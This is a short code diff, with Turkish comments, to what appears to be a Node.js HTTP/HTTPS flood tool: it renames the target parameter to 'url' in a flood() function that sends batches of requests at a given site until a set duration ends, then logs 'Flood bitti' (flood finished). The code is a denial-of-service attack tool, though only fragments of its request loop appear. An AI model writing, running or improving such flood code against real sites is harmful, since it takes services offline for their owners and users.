@@ -1,5 +1,5 @@
 // Artık http ve https çalışır
-const url = new URL(params.target);
+const url = new URL(params.url);
 const client = url.protocol === 'https:' ? https : http;
 const end = Date.now() + (params.duration * 1000);
 
@@ -20,7 +20,7 @@ async function flood() {
         }
         await Promise.all(promises);
     }
-    console.log(`Flood bitti: ${params.target}`);
+    console.log(`Flood bitti: ${params.url}`);
 }
 
 flood();
